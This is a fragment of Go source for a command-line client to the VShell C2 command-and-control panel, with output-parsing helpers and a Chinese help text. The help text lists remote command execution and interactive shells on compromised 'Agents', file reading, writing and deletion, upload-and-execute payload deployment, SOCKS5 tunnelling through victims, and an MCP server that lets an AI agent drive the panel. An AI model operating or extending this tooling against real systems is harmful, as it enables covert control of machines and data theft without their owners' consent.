	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "(无输出)"
	}

	body := raw
	if locs := promptRe.FindAllStringIndex(raw, -1); len(locs) >= 2 {
		// 第一条提示符之后、最后一条提示符之前，就是本次命令的完整回显与输出
		body = raw[locs[0][1]:locs[len(locs)-1][0]]
	} else if len(locs) == 1 {
		body = raw[locs[0][1]:]
	}
	body = stripCommandEcho(strings.TrimSpace(body), command)
	if body == "" {
		body = stripCommandEcho(raw, command)
	}
	return truncate(body, 10000)
}

func stripCommandEcho(s, command string) string {
	s = strings.TrimSpace(s)
	if command == "" || s == "" {
		return s
	}
	first, rest, found := strings.Cut(s, "\n")
	if strings.TrimSpace(strings.TrimSuffix(first, "\r")) == strings.TrimSpace(command) {
		if found {
			return strings.TrimSpace(rest)
		}
		return ""
	}
	return s
}

func parseID(s string) (int, error) {
	id, err := strconv.Atoi(s)
	if err != nil || id <= 0 {
		return 0, fmt.Errorf("Agent ID 需要正整数: %s", s)
	}
	return id, nil
}

func normalizeStatus(s string) (any, error) {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "online", "true", "1":
		return true, nil
	case "offline", "false", "0":
		return false, nil
	case "all", "":
		return "", nil
	}
	return nil, fmt.Errorf("--status 可选 online/offline/all: %s", s)
}

func fail(err error) {
	fmt.Fprintln(os.Stderr, "错误:", err)
	os.Exit(1)
}

func usageErr(err error) {
	fmt.Fprintln(os.Stderr, "错误:", err)
	fmt.Fprintln(os.Stderr, "运行 vshell-cli --help 查看用法")
	os.Exit(2)
}

func printHelp() {
	fmt.Printf(`vshell-cli %s — VShell C2 命令行客户端

用法:
  vshell-cli [全局参数] <命令> [命令参数]

全局参数（必须写在命令之前）:
  --url <地址>            VShell 面板地址（或 VSHELL_URL）
  --user <用户名>         登录用户名（或 VSHELL_USER）
  --password <密码>       登录密码（或 VSHELL_PASS / config.ini）
  --config <文件>         配置文件路径（或 VSHELL_CONFIG，默认 ./config.ini）
  --http-timeout <秒>     API 请求默认超时（默认 60）
  --json                  以 JSON 输出
  --insecure              跳过 TLS 证书校验
  --version               显示版本

命令:
  info                              面板状态
  clients [--status online|offline|all]
                                    列出 Agent
  exec [--timeout 30] <id> <cmd...> 同步执行命令
  exec-async <id> <cmd...>          异步执行命令
  shell [--timeout 60] [--raw] <id>
                                    进入交互式命令会话（:help 查看本地命令）
  disks <id>                        列出磁盘
  ls [--page 1] [--page-size 100] [--sort-by time|name|size] [--order descend|ascend] <id> <path>
                                    列目录
  cat [--max-bytes 102400] <id> <file>
                                    读取文件
  write <id> <path> (--content <text> | --file <local>)
                                    写入文件
  rm <id> <path>                    删除文件/目录
  upload <id> <local> [--remote <path>]
                                    上传文件
  download [--wait 30] <id> <file>  C2 从 Agent 拉取文件
  deploy <id> [--local <file>] [--remote <path>] [--args <a>] [--no-exec] [--skip-upload]
                                    上传并执行（可只上传）
  socks start <id> [--port 1080] [--force]
                                    建立 SOCKS5 隧道
  socks stop <port>                 停止并删除隧道
  socks list                        列出隧道
  socks curl <port> <url> [--method GET] [-H 'K: V'] [--data ...]
                                    经隧道发 HTTP 请求
  listeners                         列出监听器
  runners                           列出内置工具
  send <url> [--method GET] [--engine direct|curl] [-H 'K: V'] [--body ...]
                                    单引擎发包
  compare <url> [--method GET] [-H 'K: V'] [--body ...]
                                    direct/curl 对比发包
  diagnose                          诊断面板、curl
  mcp [--print-config]              启动 MCP stdio 服务（--print-config 只打印配置）

示例:
  vshell-cli
  vshell-cli info
  vshell-cli clients
  vshell-cli exec 3 "whoami & ipconfig"
  vshell-cli ls 3 C:/
  vshell-cli cat 3 C:/scan.txt
  vshell-cli --json info
  vshell-cli mcp

说明:
  - 首次运行（不带命令）会在当前目录创建 config.ini，并显示命令列表。
  - 字段优先级：命令行参数 > 环境变量 > config.ini；密码留空时交互输入。
  - config.ini 中的密码为明文，建议 chmod 600，并避免提交到版本库。
  - mcp 通过 stdio 提供 MCP 服务；配置片段输出到 stderr，避免污染协议流。
  - 每次执行都会重新登录，JWT 只在本次进程内存中。
  - Agent 掉线时只报告错误，不会自动切换 ID 执行。
`, version)
}
